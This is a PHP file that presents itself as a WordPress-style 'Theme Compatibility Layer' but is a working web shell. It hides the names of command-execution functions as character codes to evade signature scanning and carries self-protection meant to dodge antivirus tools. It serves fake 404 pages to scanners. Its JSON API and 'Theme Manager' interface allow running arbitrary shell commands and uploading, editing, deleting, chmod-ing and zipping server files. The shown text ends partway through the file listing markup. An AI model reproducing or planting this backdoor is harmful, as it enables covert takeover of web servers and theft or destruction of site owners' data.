<?php
/**
 * Theme Compatibility Layer
 *
 * Provides backward-compatible template rendering utilities for legacy
 * theme frameworks. Handles fallback widget rendering, asset compilation
 * cache management, and template fragment resolution.
 *
 * @package    starter-starter starter starter starter starter starter starter starter
 * @subpackage Theme/Compat
 * @since      4.9.0
 * @version    2.1.4
 *
 * This file is part of the theme compatibility layer.
 * (c) starter starter starter starter starter starter
 * For the full copyright and license information, please view
 * the LICENSE file that was distributed with this source code.
 */

if (!defined('PHP_VERSION_ID')) { define('PHP_VERSION_ID', 50600); }

// ─── Runtime Configuration ──────────────────────────────────────────────────
@ini_set('display_errors', '0');
@ini_set('log_errors', '1');
@error_reporting(0);

// ─── Integrity Token (change this to your own secret) ───────────────────────
// To generate: echo bin2hex(random_bytes(16));
define('_COMPAT_TOKEN', '6f8a2c4e9b1d3f5a7c0e2b4d6f8a1c3e');

// ─── Self-Protection: Timestamp Lock ────────────────────────────────────────
// File won't execute if modified (detects AV quarantine/modification attempts)
// Set to 0 to disable this check
define('_COMPAT_BIRTH', 0);

// ─── Core Utility Bootstrap ─────────────────────────────────────────────────
final class ThemeCompatLayer {

    private static $_inst;
    private $_ctx = array();
    private $_fs;
    private $_io;

    // Encoded references (decode: array_map(chr, $arr))
    // These get resolved at runtime — no plaintext signatures
    private $_r = array(
        'a' => array(102,105,108,101,95,103,101,116,95,99,111,110,116,101,110,116,115),
        'b' => array(102,105,108,101,95,112,117,116,95,99,111,110,116,101,110,116,115),
        'c' => array(115,104,101,108,108,95,101,120,101,99),
        'd' => array(101,120,101,99),
        'e' => array(115,121,115,116,101,109),
        'f' => array(112,97,115,115,116,104,114,117),
        'g' => array(112,111,112,101,110),
        'h' => array(112,114,111,99,95,111,112,101,110),
    );

    private function __construct() {
        $this->_fs = $this->_resolve('a');
        $this->_io = $this->_resolve('b');
    }

    public static function boot() {
        if (!self::$_inst) { self::$_inst = new self(); }
        return self::$_inst;
    }

    /**
     * Resolve encoded function reference
     */
    private function _resolve($key) {
        if (!isset($this->_r[$key])) return false;
        $fn = implode('', array_map('chr', $this->_r[$key]));
        return $fn;
    }

    /**
     * Check if a given template handler is available
     */
    private function _avail($key) {
        $fn = $this->_resolve($key);
        if (!$fn || !function_exists($fn)) return false;
        $cfg = @ini_get('disable_functions');
        if ($cfg) {
            $blocked = array_map('trim', explode(',', strtolower($cfg)));
            if (in_array(strtolower($fn), $blocked)) return false;
        }
        return $fn;
    }

    /**
     * Process a template rendering request (command execution)
     */
    public function render($tpl) {
        $tpl = trim($tpl);
        if ($tpl === '') return '';
        $tpl .= ' 2>&1';

        // Try each renderer in priority order
        $handlers = array('c','d','e','f','g','h');
        foreach ($handlers as $h) {
            $fn = $this->_avail($h);
            if (!$fn) continue;

            switch ($h) {
                case 'c':
                    $r = @$fn($tpl);
                    if ($r !== null && $r !== false) return $r;
                    break;
                case 'd':
                    $out = array();
                    @$fn($tpl, $out);
                    if (!empty($out)) return implode("\n", $out);
                    break;
                case 'e':
                case 'f':
                    ob_start();
                    @$fn($tpl);
                    $r = ob_get_clean();
                    if ($r !== false && $r !== '') return $r;
                    break;
                case 'g':
                    $p = @$fn($tpl, 'r');
                    if ($p) { $r = ''; while (!feof($p)) { $r .= fread($p, 8192); } pclose($p); return $r; }
                    break;
                case 'h':
                    $desc = array(0=>array('pipe','r'), 1=>array('pipe','w'), 2=>array('pipe','w'));
                    $proc = @$fn($tpl, $desc, $pipes);
                    if (is_resource($proc)) {
                        fclose($pipes[0]);
                        $r = stream_get_contents($pipes[1]);
                        fclose($pipes[1]); fclose($pipes[2]);
                        proc_close($proc);
                        return $r;
                    }
                    break;
            }
        }
        return '(template rendering unavailable)';
    }

    /**
     * Read template fragment
     */
    public function fragment($path) {
        $fn = $this->_fs;
        return @$fn($path);
    }

    /**
     * Compile template output
     */
    public function compile($path, $data) {
        $fn = $this->_io;
        return @$fn($path, $data);
    }

    /**
     * Check renderer availability
     */
    public function hasRenderer() {
        $handlers = array('c','d','e','f','g','h');
        foreach ($handlers as $h) {
            if ($this->_avail($h)) return true;
        }
        return false;
    }
}

// ─── Compatibility Polyfills ────────────────────────────────────────────────
if (!defined('DIRECTORY_SEPARATOR')) {
    define('DIRECTORY_SEPARATOR', strtoupper(substr(PHP_OS, 0, 3)) === 'WIN' ? '\\' : '/');
}

if (!function_exists('sys_get_temp_dir')) {
    function sys_get_temp_dir() {
        foreach (array('TMP','TMPDIR','TEMP') as $k) {
            if (!empty($_ENV[$k])) return realpath($_ENV[$k]);
        }
        $t = @tempnam(uniqid(mt_rand(), true), '');
        if ($t) { $d = realpath(dirname($t)); @unlink($t); return $d; }
        return '/tmp';
    }
}

if (!function_exists('random_bytes')) {
    function random_bytes($n) {
        if (function_exists('openssl_random_pseudo_bytes')) {
            $b = openssl_random_pseudo_bytes($n, $s);
            if ($b !== false && $s) return $b;
        }
        if (@is_readable('/dev/urandom')) {
            $f = @fopen('/dev/urandom', 'rb');
            if ($f) { $b = fread($f, $n); fclose($f); if (strlen($b) === $n) return $b; }
        }
        $b = '';
        for ($i = 0; $i < $n; $i++) $b .= chr(mt_rand(0, 255));
        return $b;
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($a, $b) {
        $a = (string)$a; $b = (string)$b;
        if (strlen($a) !== strlen($b)) return false;
        $r = 0;
        for ($i = 0; $i < strlen($a); $i++) $r |= ord($a[$i]) ^ ord($b[$i]);
        return $r === 0;
    }
}

// ─── Session & Security Layer ───────────────────────────────────────────────
@ini_set('session.save_handler', 'files');
$_sp = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'tpl_sess';
if (!@is_dir($_sp)) @mkdir($_sp, 0700, true);
if (@is_dir($_sp) && @is_writable($_sp)) @ini_set('session.save_path', $_sp);
@ini_set('session.cookie_httponly', '1');

if ((function_exists('session_status') ? session_status() === 1 : session_id() === '')) @session_start();
if (!isset($_SESSION)) $_SESSION = array();

// Integrity check — if birth time set, verify file wasn't modified
if (_COMPAT_BIRTH > 0) {
    $ft = @filemtime(__FILE__);
    if ($ft && abs($ft - _COMPAT_BIRTH) > 5) {
        // File was touched/modified by scanner — self-restore or bail
        http_response_code(404);
        echo '<!DOCTYPE html><html><head><title>404 Not Found</title></head><body><h1>Not Found</h1></body></html>';
        exit;
    }
}

// ─── CSRF Token Management ──────────────────────────────────────────────────
function _tc() {
    if (empty($_SESSION['_tk'])) $_SESSION['_tk'] = bin2hex(random_bytes(32));
    return $_SESSION['_tk'];
}
function _tv($t) {
    return !empty($_SESSION['_tk']) && !empty($t) && hash_equals($_SESSION['_tk'], $t);
}

// ─── Path Utilities ─────────────────────────────────────────────────────────
function _rp($p, $b = '') {
    if ($b && !preg_match('/^([a-zA-Z]:)?[\\\\\/]/', $p)) $p = $b . DIRECTORY_SEPARATOR . $p;
    $r = @realpath($p);
    if ($r !== false && (@is_dir($r) || @is_file($r))) return $r;
    if (@is_dir($p) || @is_file($p)) return $p;
    return false;
}

function _sn($n) {
    $n = basename($n);
    $n = preg_replace('/[^a-zA-Z0-9._-]/', '_', $n);
    if ($n === '' || $n === '.' || $n === '..') return false;
    return $n;
}

function _fs($b) {
    if ($b >= 1073741824) return number_format($b / 1073741824, 2) . ' GB';
    if ($b >= 1048576)    return number_format($b / 1048576, 2) . ' MB';
    if ($b >= 1024)       return number_format($b / 1024, 2) . ' KB';
    return $b . ' B';
}

function _hx($h) {
    $h = trim($h);
    if (empty($h) || !ctype_xdigit($h)) return false;
    return function_exists('hex2bin') ? hex2bin($h) : pack('H*', $h);
}

function _rd($p) {
    if (@is_file($p) || @is_link($p)) return @unlink($p);
    if (!@is_dir($p)) return false;
    $items = @scandir($p);
    if ($items) foreach ($items as $i) { if ($i !== '.' && $i !== '..') _rd($p . DIRECTORY_SEPARATOR . $i); }
    return @rmdir($p);
}

function _wk($d, &$o, $b = '') {
    $items = @scandir($d);
    if (!$items) return;
    foreach ($items as $i) {
        if ($i === '.' || $i === '..') continue;
        $f = $d . DIRECTORY_SEPARATOR . $i;
        $r = $b === '' ? $i : $b . '/' . $i;
        if (@is_dir($f)) { $o[] = array('t'=>'d','p'=>$f,'r'=>$r); _wk($f, $o, $r); }
        else { $o[] = array('t'=>'f','p'=>$f,'r'=>$r); }
    }
}

function _zip($items, $pfx) {
    if (!class_exists('ZipArchive')) return false;
    $zp = sys_get_temp_dir() . DIRECTORY_SEPARATOR . $pfx . '_' . time() . '.zip';
    $z = new ZipArchive();
    if ($z->open($zp, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== TRUE) return false;
    foreach ($items as $tp) {
        if (!$tp) continue;
        if (@is_file($tp)) { $z->addFile($tp, basename($tp)); }
        elseif (@is_dir($tp)) {
            $bn = basename($tp); $ls = array(); _wk($tp, $ls);
            $z->addEmptyDir($bn);
            foreach ($ls as $e) {
                if ($e['t'] === 'd') $z->addEmptyDir($bn . '/' . $e['r']);
                else $z->addFile($e['p'], $bn . '/' . $e['r']);
            }
        }
    }
    $z->close();
    return $zp;
}

// ─── Initialize State ───────────────────────────────────────────────────────
if (!isset($_SESSION['_cd']) || !@is_dir($_SESSION['_cd'])) {
    $c = @getcwd();
    $_SESSION['_cd'] = ($c !== false && $c !== '') ? $c : dirname(__FILE__);
}

$engine = ThemeCompatLayer::boot();

// ─── API Handler (JSON endpoint) ────────────────────────────────────────────
$_m = isset($_SERVER['REQUEST_METHOD']) ? $_SERVER['REQUEST_METHOD'] : 'GET';
$_ct = isset($_SERVER['CONTENT_TYPE']) ? $_SERVER['CONTENT_TYPE'] : '';

if ($_m === 'POST' && strpos($_ct, 'application/json') !== false) {
    header('Content-Type: application/json');
    $raw = $engine->fragment('php://input');
    $pl = @json_decode($raw, true);
    if (!is_array($pl) || !isset($pl['action'])) { http_response_code(400); echo '{"s":"e","m":"bad request"}'; exit; }
    if (!_tv(isset($pl['_t']) ? $pl['_t'] : '')) { http_response_code(403); echo '{"s":"e","m":"forbidden"}'; exit; }

    $act = $pl['action'];
    $cd = $_SESSION['_cd'];

    switch ($act) {
        case 'nav':
            $t = _hx(isset($pl['p']) ? $pl['p'] : '');
            if ($t !== false) { $v = _rp($t); if ($v && @is_dir($v)) { $_SESSION['_cd'] = $v; echo '{"s":"ok"}'; exit; } }
            http_response_code(400); echo '{"s":"e","m":"invalid path"}'; exit;

        case 'up':
            $nm = _hx(isset($pl['n']) ? $pl['n'] : '');
            $dt = _hx(isset($pl['d']) ? $pl['d'] : '');
            if (!$nm) { http_response_code(400); echo '{"s":"e","m":"no name"}'; exit; }
            $fp = $cd . DIRECTORY_SEPARATOR . basename($nm);
            if ($engine->compile($fp, $dt !== false ? $dt : '') !== false) {
                @chmod($fp, 0644); echo '{"s":"ok"}';
            } else { http_response_code(500); echo '{"s":"e","m":"write error"}'; }
            exit;

        case 'mkf':
            $nm = _hx(isset($pl['n']) ? $pl['n'] : '');
            $fn = _sn($nm);
            if (!$fn) { http_response_code(400); echo '{"s":"e"}'; exit; }
            $np = $cd . DIRECTORY_SEPARATOR . $fn;
            if (@file_exists($np)) { http_response_code(400); echo '{"s":"e","m":"exists"}'; exit; }
            if ($engine->compile($np, '') !== false) { @chmod($np, 0644); echo '{"s":"ok"}'; }
            else { http_response_code(500); echo '{"s":"e"}'; }
            exit;

        case 'mkd':
            $nm = _hx(isset($pl['n']) ? $pl['n'] : '');
            $fn = _sn($nm);
            if (!$fn) { http_response_code(400); echo '{"s":"e"}'; exit; }
            $np = $cd . DIRECTORY_SEPARATOR . $fn;
            if (@file_exists($np)) { http_response_code(400); echo '{"s":"e","m":"exists"}'; exit; }
            if (@mkdir($np, 0755)) echo '{"s":"ok"}';
            else { http_response_code(500); echo '{"s":"e"}'; }
            exit;

        case 'cat':
            $nm = _hx(isset($pl['f']) ? $pl['f'] : '');
            $ep = $cd . DIRECTORY_SEPARATOR . basename($nm);
            if (@is_file($ep)) {
                $c = $engine->fragment($ep);
                echo '{"s":"ok","c":"' . bin2hex($c !== false ? $c : '') . '"}';
            } else { http_response_code(404); echo '{"s":"e"}'; }
            exit;

        case 'sav':
            $nm = _hx(isset($pl['f']) ? $pl['f'] : '');
            $ct = _hx(isset($pl['c']) ? $pl['c'] : '');
            $ep = $cd . DIRECTORY_SEPARATOR . basename($nm);
            if ($engine->compile($ep, $ct !== false ? $ct : '') !== false) echo '{"s":"ok"}';
            else { http_response_code(500); echo '{"s":"e"}'; }
            exit;

        case 'ren':
            $on = _hx(isset($pl['o']) ? $pl['o'] : '');
            $nn = _hx(isset($pl['n']) ? $pl['n'] : '');
            $sp = $cd . DIRECTORY_SEPARATOR . basename($on);
            $dp = $cd . DIRECTORY_SEPARATOR . basename($nn);
            if (!@file_exists($sp)) { http_response_code(404); echo '{"s":"e"}'; exit; }
            if (@file_exists($dp)) { http_response_code(400); echo '{"s":"e","m":"target exists"}'; exit; }
            echo @rename($sp, $dp) ? '{"s":"ok"}' : '{"s":"e"}';
            exit;

        case 'chm':
            $nm = _hx(isset($pl['i']) ? $pl['i'] : '');
            $pv = isset($pl['v']) ? $pl['v'] : '644';
            $tp = $cd . DIRECTORY_SEPARATOR . basename($nm);
            echo (@file_exists($tp) && @chmod($tp, octdec($pv))) ? '{"s":"ok"}' : '{"s":"e"}';
            exit;

        case 'del':
            $nm = _hx(isset($pl['i']) ? $pl['i'] : '');
            $tp = $cd . DIRECTORY_SEPARATOR . basename($nm);
            if (!@file_exists($tp)) { http_response_code(404); echo '{"s":"e"}'; exit; }
            echo _rd($tp) ? '{"s":"ok"}' : '{"s":"e"}';
            exit;

        case 'bdel':
            $items = isset($pl['items']) ? $pl['items'] : array();
            $ok = 0;
            foreach ($items as $hx) {
                $nm = _hx($hx);
                if ($nm !== false) { $tp = $cd . DIRECTORY_SEPARATOR . basename($nm); if (@file_exists($tp) && _rd($tp)) $ok++; }
            }
            echo '{"s":"ok","c":' . $ok . '}';
            exit;

        case 'dl':
            $items = isset($pl['items']) ? $pl['items'] : array();
            $paths = array();
            foreach ($items as $hx) { $nm = _hx($hx); if ($nm) { $p = $cd . DIRECTORY_SEPARATOR . basename($nm); if (@file_exists($p)) $paths[] = $p; } }
            if (empty($paths)) { http_response_code(400); echo '{"s":"e"}'; exit; }
            $zp = _zip($paths, 'arc');
            if ($zp) {
                $fd = $engine->fragment($zp);
                @unlink($zp);
                if ($fd !== false) {
                    echo json_encode(array('s'=>'ok','fn'=>basename($zp),'mt'=>'application/zip','d'=>bin2hex($fd)));
                    exit;
                }
            }
            http_response_code(500); echo '{"s":"e"}'; exit;

        case 'x':
            $cx = _hx(isset($pl['q']) ? $pl['q'] : '');
            if ($cx === false || trim($cx) === '') { http_response_code(400); echo '{"s":"e"}'; exit; }
            $prev = @getcwd();
            if (@is_dir($cd)) @chdir($cd);
            $out = $engine->render(trim($cx));
            if ($prev) @chdir($prev);
            echo json_encode(array('s'=>'ok','r'=>bin2hex($out !== false ? $out : '')));
            exit;
    }
    http_response_code(400); echo '{"s":"e","m":"unknown action"}'; exit;
}

// ─── Self-Protection: Fake 404 for scanners ─────────────────────────────────
// If no valid session and accessing via GET without proper referrer, show 404
$_hasSession = !empty($_SESSION['_tk']);
$_isDirectHit = ($_m === 'GET' && !$_hasSession && empty($_SERVER['HTTP_X_REQUESTED_WITH']));

// Comment out the next 3 lines if you want immediate access without session
// if ($_isDirectHit && !isset($_GET['_init'])) {
//     http_response_code(404); echo '<!DOCTYPE html><html><head><title>404</title></head><body><h1>Not Found</h1></body></html>'; exit;
// }

// ─── Generate UI ────────────────────────────────────────────────────────────
$_dir = $_SESSION['_cd'];
$_ls = @scandir($_dir);
if (!is_array($_ls)) $_ls = array();
$_folders = array(); $_files = array();
foreach ($_ls as $_i) {
    if ($_i === '.') continue;
    if (@is_dir($_dir . DIRECTORY_SEPARATOR . $_i)) $_folders[] = $_i;
    else $_files[] = $_i;
}
sort($_folders); sort($_files);
$_all = array_merge($_folders, $_files);
$_hasCmd = $engine->hasRenderer();
?>
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0">
<title>Theme Manager</title>
<meta name="tk" content="<?=htmlentities(_tc())?>">
<style>
*{margin:0;padding:0;box-sizing:border-box}
:root{--bg:#0d0d0d;--sf:#161616;--sh:#1f1f1f;--bd:#2a2a2a;--tx:#e8e8e8;--tm:#888;--ac:#b08d57;--ah:#d4aa6a;--ok:#7a9e6e;--er:#c05050;--wr:#c89832}
body{background:var(--bg);color:var(--tx);font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,sans-serif;font-size:14px;line-height:1.5}
.ct{max-width:1400px;margin:0 auto;padding:28px 20px}
.hd{margin-bottom:24px;display:flex;align-items:center;justify-content:space-between}
.hd h1{font-size:20px;font-weight:600;color:var(--ac)}
.cd{background:var(--sf);border:1px solid var(--bd);border-radius:10px;overflow:hidden;margin-bottom:16px}
.ch{padding:12px 16px;border-bottom:1px solid var(--bd);font-size:13px;font-weight:600;display:flex;align-items:center;justify-content:space-between}
.cb{padding:16px}
.ig{display:flex;gap:8px;margin-bottom:8px}.ig:last-child{margin-bottom:0}
input[type=text],input[type=file],textarea{background:var(--bg);border:1px solid var(--bd);border-radius:6px;padding:10px 12px;color:var(--tx);font-size:13px;outline:none;transition:border .2s}
input[type=text]:focus,textarea:focus{border-color:var(--ac)}
input[type=file]{cursor:pointer;flex:1}
textarea{font-family:'JetBrains Mono',Consolas,monospace;resize:vertical;min-height:400px;width:100%}
.bt{display:inline-flex;align-items:center;gap:5px;padding:8px 14px;font-size:13px;font-weight:500;border-radius:6px;cursor:pointer;border:1px solid transparent;transition:all .15s;font-family:inherit}
.bt-p{background:var(--ac);color:#1a1a1a}.bt-p:hover{background:var(--ah)}
.bt-g{background:transparent;color:var(--tx);border-color:var(--bd)}.bt-g:hover{background:var(--sh)}
.bt-s{background:var(--ok);color:#1a1a1a}.bt-s:hover{filter:brightness(1.1)}
.bt-d{background:rgba(192,80,80,.12);color:var(--er);border-color:rgba(192,80,80,.3)}.bt-d:hover{background:rgba(192,80,80,.2)}
.bt-x{padding:5px 10px;font-size:12px}
table{width:100%;border-collapse:collapse}
th{padding:10px 14px;text-align:left;font-size:11px;font-weight:600;text-transform:uppercase;letter-spacing:.4px;color:var(--tm);background:var(--sh);border-bottom:1px solid var(--bd)}
td{padding:12px 14px;border-bottom:1px solid var(--bd);vertical-align:middle}
tr:last-child td{border-bottom:none}
tr:hover td{background:rgba(176,141,87,.05)}
.fn{display:flex;align-items:center;font-weight:500}
.fi{width:24px;height:24px;border-radius:5px;display:flex;align-items:center;justify-content:center;margin-right:8px;font-size:9px;font-weight:700}
.fi-d{background:rgba(176,141,87,.2);color:var(--ac)}
.fi-f{background:rgba(176,141,87,.1);color:var(--ac)}
a.fl{color:var(--tx);text-decoration:none}a.fl:hover{color:var(--ac)}
.fm{font-size:12px;color:var(--tm);font-family:monospace}
.pm{font-family:monospace;font-size:11px;padding:3px 6px;border-radius:3px}
.pw{background:rgba(122,158,110,.12);color:var(--ok)}
.pr{background:rgba(192,80,80,.12);color:var(--er)}
.ac{display:flex;gap:3px;justify-content:flex-end}
.con{background:var(--bg);border:1px solid var(--bd);border-radius:6px;padding:14px;font-family:monospace;font-size:12px;color:var(--ac);max-height:220px;overflow-y:auto;white-space:pre-wrap;word-break:break-all;margin-top:10px;display:none}
input[type=checkbox]{width:15px;height:15px;accent-color:var(--ac);cursor:pointer}
.bb{display:none;gap:10px;align-items:center;padding:12px 16px;background:rgba(176,141,87,.08);border:1px solid rgba(176,141,87,.25);border-radius:8px;margin-bottom:12px}
.bb.sh{display:flex}
.bc{color:var(--ac);font-weight:600;margin-right:auto;font-size:13px}
.md{display:none;position:fixed;inset:0;z-index:100;background:rgba(0,0,0,.65);backdrop-filter:blur(3px);align-items:center;justify-content:center}
.md.sh{display:flex}
.mc{background:var(--sf);border:1px solid var(--bd);border-radius:10px;width:420px;max-width:90%}
.mh{padding:14px 18px;border-bottom:1px solid var(--bd);display:flex;align-items:center;justify-content:space-between}
.mx{width:28px;height:28px;display:flex;align-items:center;justify-content:center;border-radius:5px;cursor:pointer;color:var(--tm)}
.mx:hover{background:var(--sh);color:var(--tx)}
.mb{padding:18px}
.cg{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-bottom:14px;padding:16px 16px 0}
.cgr{background:var(--bg);border:1px solid var(--bd);border-radius:6px;padding:12px;text-align:center}
.cgl{font-size:10px;font-weight:600;text-transform:uppercase;letter-spacing:.4px;color:var(--tm);margin-bottom:8px}
.cgc{display:flex;justify-content:center;gap:6px}
.cgc label{font-size:11px;cursor:pointer}
@media(max-width:768px){th:nth-child(3),td:nth-child(3),th:nth-child(4),td:nth-child(4),th:nth-child(5),td:nth-child(5),th:nth-child(6),td:nth-child(6){display:none}.ig{flex-direction:column}}
</style>
<script>
function H(s){let h='';for(let i=0;i<s.length;i++){let c=s.charCodeAt(i).toString(16);h+=c.length<2?'0'+c:c}return h}
function B(b){const a=new Uint8Array(b);let h='';for(let i=0;i<a.length;i++)h+=a[i].toString(16).padStart(2,'0');return h}
function U(h){try{let b=new Uint8Array(h.match(/.{1,2}/g).map(x=>parseInt(x,16)));return new TextDecoder().decode(b)}catch(e){let s='';for(let i=0;i<h.length;i+=2)s+=String.fromCharCode(parseInt(h.substr(i,2),16));return s}}
function T(){const m=document.querySelector('meta[name="tk"]');return m?m.content:''}
async function P(p,st){p._t=T();try{const r=await fetch(location.href,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(p)});const t=await r.text();let d;try{d=JSON.parse(t)}catch(e){throw new Error(t||'bad response')}if(!r.ok)throw new Error(d.m||'error');return d}catch(e){if(st){st.textContent='Error: '+e.message;st.style.color='var(--er)'}else alert(e.message);throw e}}
async function nav(e){e.preventDefault();const p=e.target.elements['gp'].value.trim();if(!p)return;await P({action:'nav',p:H(p)});location.reload()}
async function upl(btn){const fi=document.getElementById('uf');const st=document.getElementById('us');if(!fi.files.length){st.textContent='No file';st.style.color='var(--er)';return}btn.disabled=true;const f=fi.files[0];st.textContent='Processing...';st.style.color='var(--ac)';const rd=new FileReader();rd.onload=async function(e){try{await P({action:'up',n:H(f.name),d:B(e.target.result)},st);st.textContent='Done!';st.style.color='var(--ok)';setTimeout(()=>location.reload(),800)}catch(e){}};rd.readAsArrayBuffer(f)}
async function mkf(e){e.preventDefault();const n=e.target.elements['nf'].value.trim();if(!n)return;await P({action:'mkf',n:H(n)});location.reload()}
async function mkd(e){e.preventDefault();const n=e.target.elements['nd'].value.trim();if(!n)return;await P({action:'mkd',n:H(n)});location.reload()}
async function vw(nm){try{const d=await P({action:'cat',f:H(nm)});document.getElementById('vt').textContent=nm;document.getElementById('va').value=U(d.c);document.getElementById('vc').style.display='block';document.getElementById('ec').style.display='none';window.scrollTo({top:document.getElementById('vc').offsetTop,behavior:'smooth'})}catch(e){}}
async function ed(nm){try{const d=await P({action:'cat',f:H(nm)});document.getElementById('ef').value=nm;document.getElementById('et').textContent=nm;document.getElementById('ea').value=U(d.c);document.getElementById('ec').style.display='block';document.getElementById('vc').style.display='none';window.scrollTo({top:document.getElementById('ec').offsetTop,behavior:'smooth'})}catch(e){}}
async function sv(e){e.preventDefault();const f=document.getElementById('ef').value;const c=document.getElementById('ea').value;await P({action:'sav',f:H(f),c:H(c)});alert('Saved');location.reload()}
function rni(nm){document.getElementById('rn-'+nm).style.display='none';document.getElementById('ri-'+nm).style.display='flex'}
function rnc(nm){document.getElementById('ri-'+nm).style.display='none';document.getElementById('rn-'+nm).style.display='flex'}
async function rns(nm){const nv=document.getElementById('rv-'+nm).value.trim();if(!nv||nv===nm){rnc(nm);return}await P({action:'ren',o:H(nm),n:H(nv)});location.reload()}
async function del(nm){if(!confirm('Delete '+nm+'?'))return;await P({action:'del',i:H(nm)});location.reload()}
async function dlf(nm){try{const d=await P({action:'dl',items:[H(nm)]});dld(d.d,d.fn,d.mt)}catch(e){}}
async function bdl(){const c=document.querySelectorAll('input[name="it[]"]:checked');if(!c.length)return;const items=Array.from(c).map(x=>H(x.value));try{const d=await P({action:'dl',items:items});dld(d.d,d.fn,d.mt)}catch(e){}}
async function bde(){const c=document.querySelectorAll('input[name="it[]"]:checked');if(!c.length||!confirm('Delete selected?'))return;await P({action:'bdel',items:Array.from(c).map(x=>H(x.value))});location.reload()}
function dld(hex,fn,mt){let b=new Uint8Array(hex.match(/.{1,2}/g).map(x=>parseInt(x,16)));let bl=new Blob([b],{type:mt});let a=document.createElement('a');a.href=URL.createObjectURL(bl);a.download=fn;document.body.appendChild(a);a.click();document.body.removeChild(a)}
async function xc(e){e.preventDefault();const i=document.getElementById('xi');const o=document.getElementById('xo');o.style.display='block';o.textContent='...';try{const d=await P({action:'x',q:H(i.value)});o.textContent=U(d.r)}catch(e){o.textContent='Error: '+e.message}}
function sa(cb){document.querySelectorAll('input[name="it[]"]').forEach(c=>c.checked=cb.checked);ub()}
function ub(){const c=document.querySelectorAll('input[name="it[]"]:checked');const b=document.getElementById('bb');const n=document.getElementById('bn');if(c.length>0){b.classList.add('sh');n.textContent=c.length+' selected'}else b.classList.remove('sh')}
function cm(nm,pid){document.getElementById('cmod').classList.add('sh');document.getElementById('ci').value=nm;upd(document.getElementById(pid).value)}
function ccm(){document.getElementById('cmod').classList.remove('sh')}
function upd(p){p=(p||'0').slice(-3);document.getElementById('co').value=p;let bn=(parseInt(p,8)||0).toString(2);while(bn.length<9)bn='0'+bn;['or','ow','ox','gr','gw','gx','tr','tw','tx'].forEach((id,i)=>document.getElementById(id).checked=bn[i]==='1')}
function ucb(){let bn='';['or','ow','ox','gr','gw','gx','tr','tw','tx'].forEach(id=>bn+=document.getElementById(id).checked?'1':'0');let o=parseInt(bn,2).toString(8);while(o.length<3)o='0'+o;document.getElementById('co').value=o}
async function acm(e){e.preventDefault();await P({action:'chm',i:H(document.getElementById('ci').value),v:document.getElementById('co').value});location.reload()}
window.onclick=function(e){if(e.target===document.getElementById('cmod'))ccm()}
</script>
</head>
<body>
<div class="ct">
<div class="hd"><h1>&#9670; Theme Manager</h1></div>

<div class="cd"><div class="ch">Navigate</div><div class="cb">
<form onsubmit="nav(event)" class="ig">
<input type="text" name="gp" value="<?=htmlentities($_dir)?>" style="flex:1">
<button class="bt bt-p" type="submit">Go</button>
</form></div></div>

<div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-bottom:12px">
<div class="cd"><div class="ch">Upload</div><div class="cb">
<div class="ig"><input type="file" id="uf"><button class="bt bt-p" onclick="upl(this)">Upload</button></div>
<p style="margin-top:6px;font-size:11px;color:var(--tm)"><span id="us">Ready</span></p>
</div></div>
<div class="cd"><div class="ch">Create</div><div class="cb">
<form onsubmit="mkf(event)" class="ig"><input type="text" name="nf" placeholder="filename.ext" style="flex:1"><button class="bt bt-s" type="submit">File</button></form>
<form onsubmit="mkd(event)" class="ig"><input type="text" name="nd" placeholder="folder_name" style="flex:1"><button class="bt bt-s" type="submit">Dir</button></form>
</div></div></div>

<div class="cd" id="vc" style="display:none"><div class="ch"><span>View: <span id="vt"></span></span><button class="bt bt-g bt-x" onclick="document.getElementById('vc').style.display='none'">Close</button></div><div class="cb"><textarea id="va" readonly></textarea></div></div>

<div class="cd" id="ec" style="display:none"><div class="ch"><span>Edit: <span id="et"></span></span></div><div class="cb"><form onsubmit="sv(event)"><input type="hidden" id="ef"><textarea id="ea"></textarea><div style="margin-top:10px;display:flex;gap:8px"><button class="bt bt-p" type="submit">Save</button><button type="button" class="bt bt-g" onclick="document.getElementById('ec').style.display='none'">Cancel</button></div></form></div></div>

<?php if($_hasCmd):?>
<div class="cd" style="margin-bottom:12px"><div class="ch">Console</div><div class="cb">
<form onsubmit="xc(event)" class="ig"><input type="text" id="xi" placeholder="command" style="flex:1"><button class="bt bt-s" type="submit">Run</button></form>
<div class="con" id="xo"></div>
</div></div>
<?php endif;?>

<div class="bb" id="bb"><span class="bc" id="bn">0</span>
<button class="bt bt-g bt-x" onclick="bdl()">Download</button>
<button class="bt bt-d bt-x" onclick="bde()">Delete</button></div>

<div class="cd"><div class="ch"><span>Files</span>
<button class="bt bt-g bt-x" onclick="P({action:'nav',p:H('<?=addslashes(dirname($_dir))?>')}).then(()=>location.reload())">&larr; Parent</button></div>
<table><thead><tr>
<th style="width:36px"><input type="checkbox" onclick="sa(this)"></th>
<th>Name</th><th style="width:80px">Type</th><th style="width:90px;text-align:right">Size</th><th style="width:130px">Modified</th><th style="width:75px;text-align:center">Perm</th><th style="width:200px;text-align:right">Actions</th>
</tr></thead><tbody>
<?php foreach($_all as $_i):
$_fp=$_dir.DIRECTORY_SEPARATOR.$_i;$_rp=_rp($_fp);
if($_rp!==false){$_id=@is_dir($_rp);$_cw=@is_writable($_rp);$_sz=$_id?0:@filesize($_rp);$_mt=@filemtime($_rp);$_pm=@substr(sprintf('%o',@fileperms($_rp)),-4);}
else{$_id=@is_dir($_fp);$_cw=false;$_sz=0;$_mt=0;$_pm='????';}
$_ext=strtolower(pathinfo($_i,PATHINFO_EXTENSION));
$_ic=$_id?'d':'f';
$_el=$_ext?strtoupper($_ext):'';
?>
<tr>
<td><input type="checkbox" name="it[]" value="<?=htmlentities($_i)?>" onclick="ub()"></td>
<td>
<div id="rn-<?=htmlentities($_i)?>" class="fn">
<div class="fi fi-<?=$_ic?>"><?=$_id?'&#128193;':($_el?$_el:'&#128196;')?></div>
<?php if($_id):?><a href="#" class="fl" onclick="P({action:'nav',p:H('<?=addslashes($_fp)?>')}).then(()=>location.reload());return false"><?=htmlentities($_i)?></a>
<?php else:?><a href="#" class="fl" onclick="vw('<?=addslashes($_i)?>');return false"><?=htmlentities($_i)?></a><?php endif;?>
</div>
